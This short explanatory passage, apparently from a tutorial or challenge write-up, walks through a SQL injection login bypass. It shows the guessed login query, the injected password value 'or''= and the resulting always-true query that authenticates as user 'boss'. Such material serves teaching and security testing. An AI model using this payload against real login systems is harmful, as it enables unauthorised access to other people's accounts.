we begin by guessing the SQL command

SELECT .... WHERE user_id='$user_id' AND password='$password'

we trick the system into authenticating up by injecting 'or''= into the password field, this would result in the final query being:

SELECT .... WHERE user_id='boss' AND password=''or''=''

''='' always return true, and therefore we're authenticated by the server
